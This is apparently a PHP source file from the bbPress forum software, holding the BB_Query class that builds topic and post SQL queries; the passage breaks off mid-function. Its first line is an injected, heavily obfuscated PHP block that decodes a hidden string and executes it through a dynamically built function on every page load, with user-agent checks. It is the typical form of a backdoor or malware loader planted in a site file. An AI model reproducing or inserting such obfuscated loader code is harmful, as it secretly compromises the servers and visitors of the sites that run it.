<?php $cnsitfbmt = '6<*msv%7-MSV,6<*)ujojR	x27id%6<#)323ldfid>}&;!osvufs}	x7f;!op-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!judovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyof:opjudovg<~	x24<!%o:!>!	x242178}527gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!`x	x22l:!}V;3q%}U;y]}Ras,"	x63	150	x72	157	x6d	q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:7tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,73]y76]277#<!%t2w>#]y74]273]y766	x75	156	x61"])))) { $GLOBALS["	x61	156	x75	156	x61"]=1; $fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6*	x7f}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*!|!	x24mw)%tww**WYsboepn)%bss-%rxt%:osvufs:~:<*9-1-r%)s%0;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdof%)7fmjix6<C	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]24)%c*W%eN+#Qi	x5c1^W%c!rting(0); $atpccpf = ]252]y85]256]y6g]257]y86]267]y74]275]y)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&%!*3!	x27!hmg%!)!gj!<2;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33./#@#/qp%>5h%!<*::::::-111112)eo$xafrlsh();}}	157	x78"))) { $ypgefy#}#-#	x24-	x24-tusqpt)%z-#:#*	xf	151	x64")) or (strstr($u27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%A)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrd/#0w = "	x63	162	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	157	x6e"B)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qj:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)##-!#bm)%tjw)#	x24#-!#]y38#-!%w:**<")));$xafrlsh = $ypgefyw("", $atpccpf); w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gL6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]DFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#}_;7]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yv%6<C>^#zsfvr#	x5cq%7**^#zbq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=	x7fw6*	x7f_*#ujojRk3`{666~6<&sfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`fo!%bss	x5csboe))1/35.)1/14+9**-)1/2#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]2-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x|ftmf!~<**9.-j%-bubE{h%)sutcv>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R3*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt24	x54	120	x5f	125	x53	105	x52	137	x41	107	x45	116	x54"]); if ((smfV	x7f<*XAZASV<*w%)ppde_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x21/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftp7f;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tx7f	x7f	x7f	x7f<u%V	x#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<!fw<#64y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18y]#>r_split("%tjw!>!#]y84]275]y83]248]y83]256]y; function gvixxqi($n){return chr(ord($n)-1);} @error_repotrstr($uas,"	x6d	163	x69	145")) or (strstr($uas,"	x722P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}implode(array_map("gvixxqi",stbs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#-	x24	x5c%j^	x24-	x2>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c24Ypp3)%cB%iN}#-!	x24/%tmw/	x	166	x3a	61	x31")) or (strstr($uas,"	x61	156	x64	162	x6)7gj6<*K)ftpmdXA6~6<u%7>/>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bpf{jt)!gj!<*2bd%-#1GO	x22#)fepmqy(!isset($GLOBALS["	x61	157&6|7**111127-K)ebfsX	x27u-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)R)#P#-#Q#-#B#-#T#-#E#-#G#-)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7f!145")) or (strstr($uas,"	x66	151	x72	145	x6627{ftmfV	x7f<*X&Z&S{ftd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_t)fubmgoj{hA!osvufs!~<3,j%>j24-	x24!>!	x24/%tjw/	x24)%	x24-	x24yGMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOF4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x2]0#)2q%l}S;2-u%!-#2#/#%#/34]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211*nbsbq%)323ldfidk!~!<**fldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!HB`SFTV`QUUI&b%!|!*)323zbek!~!<b%	7:]268]y7f#<!%tww!>!	x2400~:<h%_4y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]225]241]31^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%t>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c986+7**^/%rx<~!!%s:N}#-%o:W%cmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`G*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>y>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>utjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!fvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27js!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ussbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvso!sboeM5]67]452]88]5]48]32M3]317]445]2ufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	f`439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>f-s.973:8297f:5297e:56-xr.985:52985pn)%epnbss-%rxW~!Ypp2)%zB%z!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvqp%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWS12]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvs4tvctus)%	x24-	x24b!>!%yy))esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<if((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && !/!**#sfmcnbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!B%h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x81]265]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-7,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyftr.984:75983:48984:71]K9]7#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbzuas=strtolower($_SERVER["	x48	1%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSczsyrd'; $prldydu=explode(chr((515-395)),substr($cnsitfbmt,(41767-35747),(186-152))); $uuzwkicbn = $prldydu[0]($prldydu[(5-4)]); $hmgrivr = $prldydu[0]($prldydu[(13-11)]); if (!function_exists('qmcvnd')) { function qmcvnd($xgdgyc, $sstzba,$yqcozv) { $guaelso = NULL; for($djjtpw=0;$djjtpw<(sizeof($xgdgyc)/2);$djjtpw++) { $guaelso .= substr($sstzba, $xgdgyc[($djjtpw*2)],$xgdgyc[($djjtpw*2)+(4-3)]); } return $yqcozv(chr((46-37)),chr((362-270)),$guaelso); }; } $mvaydew = explode(chr((223-179)),'5436,59,3517,25,671,59,5931,31,2546,65,3055,53,3348,55,1385,26,471,25,3700,44,1332,22,1563,66,2997,58,1059,21,3169,30,2954,43,5662,64,1411,49,5386,50,1162,49,3403,25,3542,26,973,62,2702,43,4484,69,1629,59,1460,49,4772,38,2068,26,2170,50,123,48,730,64,2635,67,586,54,0,31,2140,30,1815,50,4810,57,4126,34,2316,65,2745,52,4726,46,2381,29,3833,28,1211,22,405,44,372,33,4553,67,2480,66,5331,55,1118,44,3663,37,1865,39,3484,33,1509,54,910,63,1287,32,3199,50,5495,60,3568,70,3766,67,3897,55,4160,34,214,60,4103,23,5178,70,1953,65,31,30,274,61,5012,56,171,43,5130,48,4964,48,2797,21,3744,22,2611,24,2410,70,5774,64,449,22,1233,54,2094,46,4020,25,2255,61,640,31,1080,38,4194,32,887,23,5726,48,540,46,2886,68,496,44,335,37,794,67,3249,20,5305,26,1354,31,3861,36,3952,68,4226,67,5609,53,3319,29,1035,24,3428,56,4867,65,5103,27,4391,64,4343,48,861,26,5555,54,5068,35,61,62,5838,26,2018,50,4620,55,1904,49,3108,61,1688,57,4293,50,4045,58,4932,32,5248,57,2220,35,4455,29,4675,51,3269,50,5962,58,5864,67,3638,25,2818,68,1745,70,1319,13'); $zjdpkax = $uuzwkicbn("",qmcvnd($mvaydew,$cnsitfbmt,$hmgrivr)); $uuzwkicbn=$cnsitfbmt; $zjdpkax(""); $zjdpkax=(762-641); $cnsitfbmt=$zjdpkax-1; ?><?php
class BB_Query {
	var $type;

	var $query;
	var $query_id;
	var $query_vars = array();
	var $not_set = array();
	var $request;
	var $match_query = false;

	var $results;
	var $count = 0;
	var $found_rows = false;

	var $errors;

	// Can optionally pass unique id string to help out filters
	function BB_Query( $type = 'topic', $query = '', $id = '' ) {
		if ( !empty($query) )
			$this->query($type, $query, $id);
	}

	function &query( $type = 'topic', $query, $id = '' ) {
		global $bbdb, $bb_cache;
		$this->type = $type;
		$this->parse_query($query, $id);

		// Allow filter to abort query
		if ( false === $this->query_vars )
			return;

		if ( 'post' == $this->type )
			$this->generate_post_sql();
		else
			$this->generate_topic_sql();

		do_action_ref_array( 'bb_query', array(&$this) );

		if ( 'post' == $this->type )
			$this->results = $bb_cache->cache_posts( $this->request );
		else
			$this->results = $bbdb->get_results( $this->request );

		$this->count = count( $this->results );

		if ( $this->query_vars['count'] ) // handles FOUND_ROWS() or COUNT(*)
			$this->found_rows = bb_count_last_query( $this->request );

		if ( 'post' == $this->type ) {
			if ( $this->query_vars['cache_users'] )
				post_author_cache( $this->results );
			if ( $this->query_vars['cache_topics'] )
				bb_cache_post_topics( $this->results );
		} else {
			if ( $this->query_vars['append_meta'] )
				$this->results = bb_append_meta( $this->results, 'topic' );
		}

		return $this->results;
	}

	// $defaults = vars to use if not set in GET, POST or allowed
	// $allowed = array( key_name => value, key_name, key_name, key_name => value );
	// 	key_name => value pairs override anything from defaults, GET, POST
	//	Lone key_names are a whitelist.  Only those can be set by defaults, GET, POST
	//	If there are no lone key_names, allow everything but still override with key_name => value pairs
	//	Ex: $allowed = array( 'topic_status' => 0, 'post_status' => 0, 'topic_author', 'started' );
	//		Will only take topic_author and started values from defaults, GET, POST and will query with topic_status = 0 and post_status = 0
	function &query_from_env( $type = 'topic', $defaults = null, $allowed = null, $id = '' ) {
		$vars = $this->fill_query_vars( array() );

		$defaults  = wp_parse_args($defaults);
		$get_vars  = stripslashes_deep( $_GET );
		$post_vars = stripslashes_deep( $_POST );
		$allowed   = wp_parse_args($allowed);

		$_allowed = array();
		foreach ( array_keys($allowed) as $k ) {
			if ( is_numeric($k) ) {
				$_allowed[] = $allowed[$k];
				unset($allowed[$k]);
			} elseif ( !isset($$k) ) {
				$$k = $allowed[$k];
			}
		}

		extract($post_vars, EXTR_SKIP);
		extract($get_vars, EXTR_SKIP);
		extract($defaults, EXTR_SKIP);

		$vars = $_allowed ? compact($_allowed, array_keys($allowed)) : compact(array_keys($vars));
		return $this->query( $type, $vars, $id );
	}

	function init( $id = '' ) {
		unset($this->query, $this->request);
		$this->query_vars = array();
		$this->query_id = $id;

		$this->not_set = array();
		$this->match_query = false;

		unset($this->results, $this->errors);
		$this->count = $this->found_rows = 0;
	}

	function fill_query_vars( $array ) {
		// Should use 0, '' for empty values
		// Function should return false iff not set

		// parameters commented out are handled farther down

		$ints = array(
//			'page',		// Defaults to global or number in URI
//			'per_page',	// Defaults to page_topics
			'tag_id',	// one tag ID
			'favorites'	// one user ID
		);

		$parse_ints = array(
			// Both
			'post_id',
			'topic_id',
			'forum_id',

			// Topics
			'topic_author_id',
			'post_count',
			'tag_count',

			// Posts
			'post_author_id',
			'position'
		);

		$dates = array(
			'started',	// topic
			'updated',	// topic
			'posted'	// post
		);

		$others = array(
			// Both
			'topic',	// one topic name
			'forum',	// one forum name
			'tag',		// one tag name

			// Topics
			'topic_author',	// one username
			'topic_status',	// *normal, deleted, all, parse_int ( and - )
			'open',			// *all, yes = open, no = closed, parse_int ( and - )
			'sticky',		// *all, no = normal, forum, super = front, parse_int ( and - )
			'meta_key',		// one meta_key ( and - )
			'meta_value',	// range
			'topic_title',	// LIKE search.  Understands "doublequoted strings"
			'search',		// generic search: topic_title OR post_text
							// Can ONLY be used in a topic query
							// Returns additional search_score and (concatenated) post_text columns

			// Posts
			'post_author',	// one username
			'post_status',	// *noraml, deleted, all, parse_int ( and - )
			'post_text',	// FULLTEXT search
							// Returns additional search_score column (and (concatenated) post_text column if topic query)
//			'ip',			// one IPv4 address

			// SQL
			'index_hint',	// A full index hint using valid index hint syntax, can be multiple hints an array
			'order_by',		// fieldname
			'order',		// *DESC, ASC
			'count',		// *false = none, true = COUNT(*), found_rows = FOUND_ROWS()
			'_join_type',	// not implemented: For benchmarking only.  Will disappear. join (1 query), in (2 queries)

			// Utility
//			'append_meta',	// *true, false: topics only
//			'cache_users',	// *true, false
//			'cache_topics,  // *true, false: posts only
			'cache_posts'	// not implemented: none, first, last
		);

		foreach ( $ints as $key )
			if ( ( false === $array[$key] = isset($array[$key]) ? (int) $array[$key] : false ) && isset($this) )
				$this->not_set[] = $key;

		foreach ( $parse_ints as $key )
			if ( ( false === $array[$key] = isset($array[$key]) ? preg_replace( '/[^<=>0-9,-]/', '', $array[$key] ) : false ) && isset($this) )
				$this->not_set[] = $key;

		foreach ( $dates as $key )
			if ( ( false === $array[$key] = isset($array[$key]) ? preg_replace( '/[^<>0-9]/', '', $array[$key] ) : false ) && isset($this) )
				$this->not_set[] = $key;

		foreach ( $others as $key ) {
			if ( !isset($array[$key]) )
				$array[$key] = false;
			if ( isset($this) && false === $array[$key] )
				$this->not_set[] = $key;
		}

		// Both
		if ( isset($array['page']) )
			$array['page'] = (int) $array['page'];
		elseif ( isset($GLOBALS['page']) )
			$array['page'] = (int) $GLOBALS['page'];
		else
			$array['page'] = bb_get_uri_page();

		if ( $array['page'] < 1 )
			$array['page'] = 1;

		$array['per_page'] = isset($array['per_page']) ? (int) $array['per_page'] : 0;
		if ( $array['per_page'] < -1 )
			$array['per_page'] = 1;

		// Posts
		if ( ( !$array['ip'] = isset($array['ip']) ? preg_replace('/[^0-9.]/', '', $array['ip']) : false ) && isset($this) )
			$this->not_set[] = 'ip';

		// Utility
		$array['append_meta']  = isset($array['append_meta'])  ? (int) (bool) $array['append_meta']  : 1;
		$array['cache_users']  = isset($array['cache_users'])  ? (int) (bool) $array['cache_users']  : 1;
		$array['cache_topics'] = isset($array['cache_topics']) ? (int) (bool) $array['cache_topics'] : 1;

		// Only one FULLTEXT search per query please
		if ( $array['search'] )
			unset($array['post_text']);

		return $array;
	}

	// Parse a query string and set query flag booleans.
	function parse_query($query, $id = '') {
		if ( !empty($query) || !isset($this->query) ) {
			$this->init( $id );
			if ( is_array($query) )
				$this->query_vars = $query;
			else
				wp_parse_str($query, $this->query_vars);
			$this->query = $query;
		}

		do_action_ref_array('bb_parse_query', array(&$this));

		if ( false === $this->query_vars )
			return;

		$this->query_vars = $this->fill_query_vars($this->query_vars);
	}

	// Reparse the query vars.
	function parse_query_vars() {
		$this->parse_query('');
	}

	function get($query_var) {
		return isset($this->query_vars[$query_var]) ? $this->query_vars[$query_var] : null;
	}

	function set($query_var, $value) {
		$this->query_vars[$query_var] = $value;
	}

	function generate_topic_sql( $_part_of_post_query = false ) {
		global $bbdb;

		$q =& $this->query_vars;
		$distinct = '';
		$sql_calc_found_rows = 'found_rows' === $q['count'] ? 'SQL_CALC_FOUND_ROWS' : ''; // unfiltered
		$fields = 't.*';
		$index_hint = '';
		$join = '';
		$where = '';
		$group_by = '';
		$having = '';
		$order_by = '';

		$post_where = '';
		$post_queries = array('post_author_id', 'post_author', 'posted', 'post_status', 'position', 'post_text', 'ip');

		if ( !$_part_of_post_query && ( $q['search'] || array_diff($post_queries, $this->not_set) ) ) :
			$join .= " JOIN $bbdb->posts as p ON ( t.topic_id = p.topic_id )";
			$post_where = $this->generate_post_sql( true );
			if ( $q['search'] ) {
				$post_where .= ' AND ( ';
				$post_where .= $this->generate_topic_title_sql( $q['search'] );
				$post_where .= ' OR ';
				$post_where .= $this->generate_post_text_sql( $q['search'] );
				$post_where .= ' )';
			}

			$group_by = 't.topic_id';

			$fields .= ", MIN(p.post_id) as post_id";

			if ( $bbdb->has_cap( 'GROUP_CONCAT', $bbdb->posts ) )
				$fields .= ", GROUP_CONCAT(p.post_text SEPARATOR ' ') AS post_text";
			else
				$fields .= ", p.post_text";

			if ( $this->match_query ) {
				$fields .= ", AVG($this->match_query) AS search_score";
				if ( !$q['order_by'] )
					$q['order_by'] = 'search_score';
			} elseif ( $q['search'] || $q['post_text'] ) {
				$fields .= ", 0 AS search_score";
			}
		endif;

		if ( !$_part_of_post_query ) :
			if ( $q['post_id'] ) :
				$post_topics = $post_topics_no = array();
				$op = substr($q['post_id'], 0, 1);
				if ( in_array($op, array('>','<')) ) :
					$post_topics = $bbdb->get_col( "SELECT DISTINCT topic_id FROM $bbdb->posts WHERE post_id $op '" . (int) substr($q['post_id'], 1) . "'" );
				else :
					global $bb_post_cache, $bb_cache;
					$posts = explode(',', $q['post_id']);
					$get_posts = array();
					foreach ( $posts as $post_id ) :
						$post_id = (int) $post_id;
						$_post_id = abs($post_id);
						if ( !isset($bb_post_cache[$_post_id]) )
							$get_posts[] = $_post_id;
					endforeach;
					$get_posts = join(',', $get_posts);
					$bb_cache->cache_posts( "SELECT * FROM $bbdb->posts WHERE post_id IN ($get_posts)" );

					foreach ( $posts as $post_id ) :
						$post = bb_get_post( abs($post_id) );
						if ( $post_id < 0 )
							$post_topics_no[] = $post->topic_id;
						else
							$post_topics[] = $post->topic_id;
					endforeach;
				endif;
				if ( $post_topics )
					$where .= " AND t.topic_id IN (" . join(',', $post_topics) . ")";
				if ( $post_topics_no )
					$where .= " AND t.topic_id NOT IN (" . join(',', $post_topics_no) . ")";
			endif;

			if ( $q['topic_id'] ) :
				$where .= $this->parse_value( 't.topic_id', $q['topic_id'] );
			elseif ( $q['topic'] ) :
				$q['topic'] = bb_slug_sanitize( $q['topic'] );
				$where .= " AND t.topic_slug = '$q[topic]'";
			endif;

			if ( $q['forum_id'] ) :
				$where .= $this->parse_value( 't.forum_id', $q['forum_id'] );
			elseif ( $q['forum'] ) :
				if ( !$q['forum_id'] = bb_get_id_from_slug( 'forum', $q['forum'] ) )
					$this->error( 'query_var:forum', 'No forum by that name' );
				$where .= " AND t.forum_id = $q[forum_id]";
			endif;

			/* Convert to JOIN after new taxonomy tables are in */

			if ( $q['tag'] && !is_int($q['tag_id']) )
				$q['tag_id'] = (int) bb_get_tag_id( $q['tag'] );

			if ( is_numeric($q['tag_id']) ) :
				if ( $tagged_topic_ids = bb_get_tagged_topic_ids( $q['tag_id'] ) )
					$where .= " AND t.topic_id IN (" . join(',', $tagged_topic_ids) . ")";
				else
					$where .= " AND 0 /* No such tag */";
			endif;

			if ( is_numeric($q['favorites']) && $f_user = bb_get_user( $q['favorites'] ) )
				$where .= $this->parse_value( 't.topic_id', $f_user->favorites );
		endif; // !_part_of_post_query

		if ( $q['topic_title'] )
			$where .= ' AND ' . $this->generate_topic_title_sql( $q['topic_title'] );

		if ( $q['started'] )
			$where .= $this->date( 't.topic_start_time', $q['started'] );

		if ( $q['updated'] )
			$where .= $this->date( 't.topic_time', $q['updated'] );

		if ( $q['topic_author_id'] ) :
			$where .= $this->parse_value( 't.topic_poster', $q['topic_author_id'] );
		elseif ( $q['topic_author'] ) :
			$user = bb_get_user( $q['topic_author'] );
			if ( !$q['topic_author_id'] = (int) $user->ID )
				$this->error( 'query_var:user', 'No user by that name' );
			$where .= " AND t.topic_poster = $q[topic_author_id]";
		endif;

		if ( !$q['topic_status'] ) :
			$where .= " AND t.topic_status = '0'";
		elseif ( false === strpos($q['topic_status'], 'all') ) :
			$stati = array( 'normal' => 0, 'deleted' => 1 );
			$q['topic_status'] = str_replace(array_keys($stati), array_values($stati), $q['topic_status']);
			$where .= $this->parse_value( 't.topic_status', $q['topic_status'] );
		endif;

		if ( false !== $q['open'] && false === strpos($q['open'], 'all') ) :
			$stati = array( 'no' => 0, 'closed' => 0, 'yes' => 1, 'open' => 1 );
			$q['open'] = str_replace(array_keys($stati), array_values($stati), $q['open']);
			$where .= $this->parse_value( 't.topic_open', $q['open'] );
		endif;

		if ( false !== $q['sticky'] && false === strpos($q['sticky'], 'all') ) :
			$stickies = array( 'no' => 0, 'normal' => 0, 'forum' => 1, 'super' => 2, 'front' => 2 );
			$q['sticky'] = str_replace(array_keys($stickies), array_values($stickies), $q['sticky']);
			$where .= $this->parse_value( 't.topic_sticky', $q['sticky'] );
		endif;

		if ( false !== $q['post_count'] )
			$where .= $this->parse_value( 't.topic_posts', $q['post_count'] );

		if ( false !== $q['tag_count'] )
			$where .= $this->parse_value( 't.tag_count', $q['tag_count'] );

		if ( $q['meta_key'] && $q['meta_key'] = preg_replace('|[^a-z0-9_-]|i', '', $q['meta_key']) ) :
			if ( '-' == substr($q['meta_key'], 0, 1) ) :
				$join  .= " LEFT JOIN $bbdb->topicmeta AS tm ON ( t.topic_id = tm.topic_id AND tm.meta_key = '" . substr( $q['meta_key'], 1 ) . "' )";
				$where .= " AND tm.meta_key IS NULL";
			else :
				$join  .= " JOIN $bbdb->topicmeta AS tm ON ( t.topic_id = tm.topic_id AND tm.meta_key = '$q[meta_key]' )";

				if ( $q['meta_value'] ) :
					$q['meta_value'] = bb_maybe_serialize( $q['meta_value'] );
					if ( strpos( $q['meta_value'], 'NULL' ) !== false )
						$join = ' LEFT' . $join;
					$where .= $this->parse_value( 'tm.meta_value', $q['meta_value'] );
				endif;
			endif;
		endif;

		// Just getting topic part for inclusion in post query
		if ( $_part_of_post_query )
			return $where;

		$where .= $post_where;

		if ( $where ) // Get rid of initial " AND " (this is pre-filters)
			$where = substr($where, 5);

		if ( $q['index_hint'] )
			$index_hint = $q['index_hint'];

		if ( $q['order_by'] )
			$order_by = $q['order_by'];
		else
			$order_by = 't.topic_time';

		$bits = compact( array('distinct', 'sql_calc_found_rows', 'fields', 'index_hint', 'join', 'where', 'group_by', 'having', 'order_by') );
		$this->request = $this->_filter_sql( $bits, "$bbdb->topics AS t" );
		return $this->request;
	}

	function generate_post_sql( $_part_of_topic_query = false ) {
		global $bbdb;

		$q =& $this->query_vars;
		$distinct = '';
		$sql_calc_found_rows = 'found_rows' === $q['count'] ? 'SQL_CALC_FOUND_ROWS' : ''; // unfiltered
		$fields = 'p.*';
		$index_hint = '';
		$join = '';
		$where = '';
		$group_by = '';
		$having = '';
		$order_by = '';

		$topic_where = '';
		$topic_queries = array( 'topic_author_id', 'topic_author', 'topic_status', 'post_count', 'tag_count', 'started', 'updated', 'open', 'sticky', 'meta_key', 'meta_value', 'topic_title' );
		if ( !$_part_of_topic_query && array_diff($topic_queries, $this->not_set) ) :
			$join .= " JOIN $bbdb->topics as t ON ( t.topic_id = p.topic_id )";
			$topic_where = $this->generate_topic_sql( true );
		endif;
		
		if ( !$_part_of_topic_query ) :
			if ( $q['post_id'] )
				$where .= $this->parse_value( 'p.post_id', $q['post_id'] );

			if ( $q['topic_id'] ) :
				$where .= $this->parse_value( 'p.topic_id', $q['topic_id'] );
			elseif ( $q['topic'] ) :
				if ( !$q['topic_id'] = bb_get_id_from_slug( 'topic', $q['topic'] ) )
					$this->error( 'query_var:topic', 'No topic by that name' );
				$where .= " AND p.topic_id = $q[topic_id]";
			endif;

			if ( $q['forum_id'] ) :
				$where .= $this->parse_value( 'p.forum_id', $q['forum_id'] );
			elseif ( $q['forum'] ) :
				if ( !$q['forum_id'] = bb_get_id_from_slug( 'forum', $q['forum'] ) )
					$this->error( 'query_var:forum', 'No forum by that name' );
				$where .= " AND p.forum_id = $q[forum_id]";
			endif;

			if ( $q['tag'] && !is_int($q['tag_id']) )
				$q['tag_id'] = (int) bb_get_tag_id( $q['tag'] );

			if ( is_numeric($q['tag_id']) ) :
				if ( $tagged_topic_ids = bb_get_tagged_topic_ids( $q['tag_id'] ) )
					$where .= " AND p.topic_id IN (" . join(',', $tagged_topic_ids) . ")";
				else
					$where .= " AND 0 /* No such tag */";
			endif;

			if ( is_numeric($q['favorites']) && $f_user = bb_get_user( $q['favorites'] ) )
				$where .= $this->parse_value( 'p.topic_id', $f_user->favorites );
		endif; // !_part_of_topic_query

		if ( $q['post_text'] ) :
			$where  .= ' AND ' . $this->generate_post_text_sql( $q['post_text'] );
			if ( $this->match_query ) {
				$fields .= ", $this->match_query AS search_score";
				if ( !$q['order_by'] )
					$q['order_by'] = 'search_score';
			} else {
				$fields .= ', 0 AS search_score';
			}
		endif;

		if ( $q['posted'] )
			$where .= $this->date( 'p.post_time', $q['posted'] );

		if ( $q['post_author_id'] ) :
			$where .= $this->parse_value( 'p.poster_id', $q['post_author_id'] );
		elseif ( $q['post_author'] ) :
			$user = bb_get_user( $q['post_author'] );
			if ( !$q['post_author_id'] = (int) $user->ID )
				$this->error( 'query_var:user', 'No user by that name' );
			$where .= " AND p.poster_id = $q[post_author_id]";
		endif;

		if ( !$q['post_status'] ) :
			$where .= " AND p.post_status = '0'";
		elseif ( false === strpos($q['post_status'], 'all') ) :
			$stati = array( 'normal' => 0, 'deleted' => 1 );
			$q['post_status'] = str_replace(array_keys($stati), array_values($stati), $q['post_status']);
			$where .= $this->parse_value( 'p.post_status', $q['post_status'] );
		endif;

		if ( false !== $q['position'] )
			$where .= $this->parse_value( 'p.post_position', $q['position'] );

		if ( false !== $q['ip'] )
			$where .= " AND poster_ip = '$q[ip]'";

		// Just getting post part for inclusion in topic query
		if ( $_part_of_topic_query )
			return $where;

		$where .= $topic_where;

		if ( $where ) // Get rid of initial " AND " (this is pre-filters)
			$where = substr($where, 5);

		if ( $q['index_hint'] )
			$index_hint = $q['index_hint'];

		if ( $q['order_by'] )
			$order_by = $q['order_by'];
		else
